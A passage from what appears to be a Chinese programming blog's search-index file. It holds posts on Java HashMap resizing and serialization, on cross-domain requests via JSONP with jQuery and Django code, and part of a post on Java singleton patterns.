class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 传入新的容量</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 引用扩容前的Entry数组</span></span><br><span class="line">    Entry[] oldTable = table;</span><br><span class="line">    <span class="keyword">int</span> oldCapacity = oldTable.length;</span><br><span class="line">    <span class="comment">// 扩容前的数组大小如果已经达到最大(2^30)了     </span></span><br><span class="line">    <span class="keyword">if</span> (oldCapacity == MAXIMUM_CAPACITY) &#123;</span><br><span class="line">        <span class="comment">// 修改阈值为int的最大值(2^31-1)，这样以后就不会扩容了</span></span><br><span class="line">        threshold = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始化一个新的Entry数组</span></span><br><span class="line">    Entry[] newTable = <span class="keyword">new</span> Entry[newCapacity];</span><br><span class="line">    <span class="comment">// 将数据转移到新的Entry数组里</span></span><br><span class="line">    transfer(newTable);</span><br><span class="line">    <span class="comment">// HashMap的table属性引用新的Entry数组</span></span><br><span class="line">    table = newTable;</span><br><span class="line">    <span class="comment">// 修改阈值</span></span><br><span class="line">    threshold = (<span class="keyword">int</span>)(newCapacity * loadFactor);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将原有Entry数组的元素拷贝到新的Entry数组里</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transfer</span><span class="params">(Entry[] newTable)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// src引用了旧的Entry数组</span></span><br><span class="line">    Entry[] src = table;                </span><br><span class="line">    <span class="keyword">int</span> newCapacity = newTable.length;</span><br><span class="line">    <span class="comment">// 遍历旧的Entry数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; src.length; j++) &#123;</span><br><span class="line">        <span class="comment">// 取得旧Entry数组的每个元素</span></span><br><span class="line">        Entry&lt;K,V&gt; e = src[j];           </span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 释放旧Entry数组的对象引用（for循环后，旧的Entry数组不再引用任何对象）</span></span><br><span class="line">            src[j] = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                Entry&lt;K,V&gt; next = e.next;</span><br><span class="line">                <span class="comment">// 重新计算每个元素在数组中的位置</span></span><br><span class="line">                <span class="keyword">int</span> i = indexFor(e.hash, newCapacity); </span><br><span class="line">                e.next = newTable[i]; <span class="comment">// 标记[1]</span></span><br><span class="line">                newTable[i] = e;      <span class="comment">// 将元素放在数组上</span></span><br><span class="line">                e = next;             <span class="comment">// 访问下一个Entry链上的元素</span></span><br><span class="line">            &#125; <span class="keyword">while</span> (e != <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newTable[i]的引用赋给了e.next，也就是使用了单链表的头插入方式，同一个位置上新元素总会被放在链表的头部位置；这样先放在一个索引的元素最终会放在Entry链的尾部（如果发生了hash冲突），这一点Java8与其不同。由于重新计算了hash值，所以最终可能放在新数组的不同位置。</p><p>下面举个例子简单说明一下扩容的原理。我们采用的hash算法就是key对数组的长度取模。其中哈希桶数组table数组的长度size=2，put的顺序是3、7、5。在mod 2后都在table[1]发生了冲突。这里假设负载因子loadFactor=1，即当键值对实际大小size大于table的实际大小时进行扩容。下面是resize的过程示意图。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-6988e87b562077bb.png" alt="" /></p><p>Java8中对新数组的索引计算采用了更加简洁的算法，不需要每次去计算hash值；而且在旧链表迁移到新链表的时候，如果新表的数组索引位置相同，则链表元素会倒置，而Java8则不会，详细解析可以见<a href="https://tech.meituan.com/java-hashmap.html" target="_blank" rel="noopener">tech.meituan.com/java-hashmap.html</a></p><h3 id="hashmap的table是transient的"><a class="markdownIt-Anchor" href="#hashmap的table是transient的"></a> HashMap的table是transient的</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> Node&lt;K,V&gt;[] table;</span><br></pre></td></tr></table></figure><p>由于table采用了transient修饰，也就是表示其不可以被序列化，它的原因如下：</p><ul><li>HashMap是基于hashCode的，hashcode作为Object的方法，是native修饰的</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>这意味着hashCode与底层相关，对于不同平台的虚拟机，会有不用的hashCode实现方式，也就是同一个对象在不同的平台下会有不同的hashcode值。</p><p>由于Java的跨平台特性，如果table不用transient修饰，在虚拟机A下的程序在虚拟机B下就会造成无法正常运行，这样就失去了其跨平台的意义，所以为了避免这样的情况，Java自己重写了其序列化table的方法，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> buckets = capacity();</span><br><span class="line">    <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line">    s.writeInt(buckets);</span><br><span class="line">    s.writeInt(size);</span><br><span class="line">    internalWriteEntries(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                            loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal mappings count: "</span> +</span><br><span class="line">                                            mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                    DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                    (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                    MAXIMUM_CAPACITY :</span><br><span class="line">                    tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                        (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><ul><li><a href="http://zhangshixi.iteye.com/blog/672697" target="_blank" rel="noopener">深入Java集合学习系列：HashMap的实现原理</a></li><li><a href="http://www.importnew.com/25049.html" target="_blank" rel="noopener">图解集合 4 ：HashMap</a></li><li><a href="https://tech.meituan.com/java-hashmap.html" target="_blank" rel="noopener">Java 8系列之重新认识HashMap</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 集合 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域请求解决方法——jsonp</title>
      <link href="/CORS-JSONP/"/>
      <url>/CORS-JSONP/</url>
      
        <content type="html"><![CDATA[<p>Javascript出于安全方面的考虑，不允许跨域调用其他页面的对象，但这样却给平时的开发带来了不少麻烦，这里把涉及到跨域的问题进行了简单地整理。</p><h2 id="同源策略"><a class="markdownIt-Anchor" href="#同源策略"></a> 同源策略</h2><h3 id="什么是域origin"><a class="markdownIt-Anchor" href="#什么是域origin"></a> 什么是域（origin）</h3><p>域是由三部分组成：<code>URI Schema</code>（协议类型）、<code>host name</code>（域名）、<code>port number</code>（端口号），举个例子：</p><ul><li><code>http://www.a.com</code>这个页面，<code>URI Schema</code>是http，<code>host name</code>是<code>www.a.com</code>，<code>port number</code>是默认的80；</li><li><code>https://www.b.com:8080/test/</code>这个页面，<code>URI Schema</code>是https，<code>host name</code>是<code>www.b.com</code>，<code>port number</code>是8080。</li></ul><p>上面两个页面的三个部分全部不相同，所以它们就是不同的域。下面表格可以更好地看出什么是同域：</p><table><thead><tr><th>URL</th><th>说明</th><th>是否允许通信</th></tr></thead><tbody><tr><td><code>http://www.a.com/a.js</code><br><code>http://www.a.com/b.js</code></td><td>同一域名下</td><td>允许</td></tr><tr><td><code>http://www.a.com/lab/a.js</code><br><code>http://www.a.com/script/b.js</code></td><td>同一域名下不同文件夹</td><td>允许</td></tr><tr><td><code>http://www.a.com:8000/a.js</code><br><code>http://www.a.com/b.js</code></td><td>同一域名，不同端口</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>https://www.a.com/b.js</code></td><td>同一域名，不同协议</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>http://70.32.92.74/b.js</code></td><td>域名和域名对应ip</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>http://script.a.com/b.js</code></td><td>主域相同，子域不同</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>http://a.com/b.js</code></td><td>同一域名，不同二级域名（同上）</td><td>不允许</td></tr><tr><td><code>http://www.b.com/a.js</code><br><code>http://www.a.com/b.js</code></td><td>不同域名</td><td>不允许</td></tr></tbody></table><h3 id="同源策略-2"><a class="markdownIt-Anchor" href="#同源策略-2"></a> 同源策略</h3><p>它限制了某个域下的文档或者js与另一个域中的资源交互的方式，它提供了一种安全机制，这种安全机制可以避免来自恶意网站的攻击。同源策略要求浏览器允许来自某个网页上的js请求来自另一个网页的数据，当且仅当两个页面来自相同的域。</p><p>通过同源策略可以阻止来自恶意网站的脚本通过其他网站的DOM获取其他网站的信息。可以避免CSRF和XSS攻击。</p><ul><li>同源策略限制的是浏览器或者其他提供类似浏览器服务的软件，这只是一个规范，所以浏览器是否遵守这个规范也不一定，所以IE浏览器判断同源的时候就不必考虑端口号；</li><li>同源策略限制的js，而图片、css这些事不存在同源策略限制的</li></ul><h2 id="jsonp方式的原理"><a class="markdownIt-Anchor" href="#jsonp方式的原理"></a> jsonp方式的原理</h2><ul><li>浏览器的同源策略把跨域请求都禁止了</li><li>HTML的<code>&lt;script&gt;</code>标签是例外，可以突破同源策略从其他来源获取数据</li><li>我们可以通过<code>&lt;script&gt;</code>标签引入jsonp文件，然后通过一系列JS操作获取数据</li></ul><p>实现方法：通过页面中增加一个<code>&lt;script&gt;</code>标签，标签的<code>src</code>指向的是另外一个域的能够提供数据的url，同时将一个本地的<code>callback</code>方法传给服务端，服务端返回的时候将会自动指向<code>callback</code>方法。</p><p>1.通过JS在页面中append如下标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"application/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.b.com/test?callback=parseResponse"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>增加该标签之后，浏览器就会立即去请求这个url，由于<code>&lt;script src=&quot;&quot;&gt;</code>方式是不受同源策略限制的，可以避免跨域限制。</p><p>2.服务端收到callback参数之后，将它拼接在返回的数据中，返回的数据如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parseResponse(&#123;"name":"hax", "gender":"Male"&#125;);</span><br></pre></td></tr></table></figure><p>3.这样返回之后，就调用页面上的<code>parseResponse</code>方法，就达到了数据处理的目的。</p><p>4.最后将刚刚新增加到页面中的<code>&lt;script&gt;</code>元素删除。</p><h2 id="采用jsonp解决跨域问题"><a class="markdownIt-Anchor" href="#采用jsonp解决跨域问题"></a> 采用jsonp解决跨域问题</h2><p>由于本人技术水平有限，也在网上找了许多方案，但是大多没有成功（主要自己太菜了），最后结合了多个博客的讲解以及尝试，最后使用jsonp成功解决了自己遇到的问题，不过写这篇博客距离当时解决所隔时间太长，无法列出当时帮助到自己的大神们，求谅解。<br></p><p>由于后台采用了Django，故后台使用Python进行演示，其他的后台框架仿照完成即可。</p><h3 id="前端"><a class="markdownIt-Anchor" href="#前端"></a> 前端</h3><p>代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitComment</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">'GET'</span>,</span><br><span class="line">        url: url,</span><br><span class="line">        data: $(<span class="string">"#forml"</span>).serialize(),</span><br><span class="line">        crossDomain: <span class="literal">true</span>,</span><br><span class="line">        dataType: <span class="string">'jsonp'</span>,</span><br><span class="line">        jsonp: <span class="string">'callback'</span>,</span><br><span class="line">        jsonpCallback: <span class="string">'callback'</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(response);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Ajax error!'</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        complete: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"complete"</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上各参数详解：</p><table><thead><tr><th>参数名</th><th>参数类型</th><th>默认值</th><th>解析</th></tr></thead><tbody><tr><td>type</td><td>String</td><td>‘GET’</td><td>请求方式(‘POST’或’GET’)，其他HTTP请求方法，如PUT和DELETE也可使用，但是仅部分浏览器支持</td></tr><tr><td>url</td><td>String</td><td>当前页地址</td><td>发送请求地址</td></tr><tr><td>data</td><td>String</td><td></td><td>发送服务器的数据。将自动转换为请求字符串格式，其他详细解析课件w3school</td></tr><tr><td>crossDomain</td><td>Boolean</td><td>同域请求为false，跨域请求为true</td><td>若想在同一域内强制跨域请求(如jsonp形式)，例如，想让服务器重定向到另一个域，则需要将其设置为true</td></tr><tr><td>dataType</td><td>String</td><td></td><td>预期服务器返回的数据类型，详细可用值见下表</td></tr><tr><td>jsonp</td><td>String</td><td></td><td>在一个jsonp请求中重写回调函数的名字。这个值用来替代在&quot;callback=？&quot;这种GET或POST请求中的URL参数里的callback部分</td></tr><tr><td>jsonpCallback</td><td>String</td><td>jQuery自动生成的随机函数名</td><td>为jsonp请求指定回调函数名，用来取代自动生成的函数名，这样管理请求更容易，也能方便地提供回调函数和错误处理</td></tr><tr><td>success</td><td>Function</td><td></td><td>请求成功后的回调函数。有服务器返回，并根据dataType参数进行处理后的数据</td></tr><tr><td>error</td><td>Function</td><td></td><td>请求失败时调用此函数，具体可见w3school</td></tr><tr><td>complete</td><td>Function</td><td></td><td>请求完成后的回调函数(请求成功与失败都调用)，具体可见w3school</td></tr></tbody></table><p>dataType可用值表：</p><table><thead><tr><th>可用值</th><th>解析</th></tr></thead><tbody><tr><td>xml</td><td>返回XML文档，可用jQuery处理</td></tr><tr><td>html</td><td>返回纯文本HTML信息</td></tr><tr><td>script</td><td>返回纯文本JavaScript代码，不会自动缓存结果</td></tr><tr><td>json</td><td>返回json数据</td></tr><tr><td>jsonp</td><td>jsonp格式数据。使用JSONP形式调用函数时，如&quot;myurl?callback=?&quot;jQuery将自动替换?为正确的函数名，以执行回调函数</td></tr><tr><td>text</td><td>返回纯文本字符串</td></tr></tbody></table><p><strong>注意：</strong></p><ul><li>由于采用跨域请求，不管我们如何设置<code>type</code>参数，请求方式一定为<code>GET</code></li><li>开始调试时，每次在控制台都可以看到response，但是<code>success</code>的function就是没有调用，每次都是调用了<code>error</code>和<code>complete</code>的function，后来网上一直查，最终发现后台也需要相应的配合</li><li>由于不太明白<code>jsonp</code>与<code>jsonpCallback</code>参数的用法，所以直接将两个参数值赋一样的值</li></ul><h3 id="django后台"><a class="markdownIt-Anchor" href="#django后台"></a> Django后台</h3><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shop_comment</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># 以下是一些从请求中取出参数的操作</span></span><br><span class="line">    省略......</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = dict()</span><br><span class="line">        result[<span class="string">"returnInfo"</span>] = <span class="number">1</span></span><br><span class="line">        comment_list = list()</span><br><span class="line">        <span class="comment"># 以下代码是将数据库的操作，查到后append到comment_list里</span></span><br><span class="line">        省略......</span><br><span class="line">        result[<span class="string">"data"</span>] = comment_list</span><br><span class="line">        return_result = json.dumps(result)</span><br><span class="line">        data = <span class="string">'%s(%s);'</span> % (<span class="string">'callback'</span>, return_result)</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(data, <span class="string">'text/javascript'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        data = <span class="string">'%s(%s);'</span> % (<span class="string">'callback'</span>, &#123;<span class="string">'result'</span>: e.message&#125;)</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(data, <span class="string">'text/javascript'</span>)</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>跨域请求方式都是<code>GET</code></li><li>返回一定要用HttpResponse，不能使用JsonResponse</li><li>开始当只有返回一个参数时，并没用使用<code>json.dumps()</code>方法，前台可以正常调用<code>success</code>的方法。后来当有多个参数时，前台就一直调用<code>error</code>和<code>complete</code>的方法，后来自己尝试使用了dumps之后，发现就正常了</li></ul><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><ul><li><a href="http://www.w3school.com.cn/jquery/ajax_ajax.asp" target="_blank" rel="noopener">W3school的《jQuery ajax - ajax() 方法》</a></li><li><a href="http://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html" target="_blank" rel="noopener">Rain Man的《JavaScript跨域总结与解决办法》</a></li><li><a href="https://my.oschina.net/jasonultimate/blog/550737" target="_blank" rel="noopener">一条大河波浪宽的《ajax跨域请求原理及解决方案分析》</a></li><li><a href="https://segmentfault.com/a/1190000002799156" target="_blank" rel="noopener">别天的《JSONP原理及实现跨域方式》</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单例模式</title>
      <link href="/singleton-mode/"/>
      <url>/singleton-mode/</url>
      
        <content type="html"><![CDATA[<h2 id="单例模式的特点"><a class="markdownIt-Anchor" href="#单例模式的特点"></a> 单例模式的特点</h2><ul><li>单例类只能有一个实例</li><li>单例类必须创建自己唯一的实例</li><li>单例类必须给其他对象提供这一实例</li></ul><h2 id="饿汉-vs-懒汉"><a class="markdownIt-Anchor" href="#饿汉-vs-懒汉"></a> 饿汉 vs 懒汉</h2><ul><li>饿汉：声明实例引用时即实例化</li><li>懒汉：静态方法第一次被调用前不实例化，也即懒加载。对于创建实例代价大，且不定会使用时，使用懒加载可以减少开销</li></ul><h2 id="解决方案"><a class="markdownIt-Anchor" href="#解决方案"></a> 解决方案</h2><h3 id="在多线程环境中能工作但是效率不高不建议面试采用懒汉"><a class="markdownIt-Anchor" href="#在多线程环境中能工作但是效率不高不建议面试采用懒汉"></a> 在多线程环境中能工作，但是效率不高，不建议面试采用（懒汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Singleton1 &#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton1 instance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton1 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton1();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：线程安全，可确保正常使用（不考虑通过反射调用私有构造方法），只有一个实例</li><li>缺点：每次获取实例都需要申请锁，开销大，效率低</li></ul><h3 id="加同步锁前后两次判断实例是否存在懒汉"><a class="markdownIt-Anchor" href="#加同步锁前后两次判断实例是否存在懒汉"></a> 加同步锁前后两次判断实例是否存在（懒汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton2</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton2 instance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton2 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton2<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton2();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：不需要在每次调用时加锁，效率比上一个高</li><li>缺点：虽然使用了<code>synchronized</code>，但本质上是线程不安全的</li></ul><h3 id="双重检查double-check下的懒汉"><a class="markdownIt-Anchor" href="#双重检查double-check下的懒汉"></a> 双重检查（Double Check）下的懒汉</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton3 instance;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton3</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton3 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton3<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton3();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：使用了双重检查，避免了线程不安全，同时避免了不必要的锁开销</li><li>缺点：无</li><li><strong>注意：使用<code>volatile</code>关键字的目的不是保证可见性（<code>synchronized</code>已经保证了可见性），而是为了保证顺序性。具体来说，<code>instance = new Singleton3()</code>不是原子操作，实际上被拆分为了三步：1) 分配内存；2) 初始化对象；3) 将<code>instance</code>指向分配的对象内存地址。 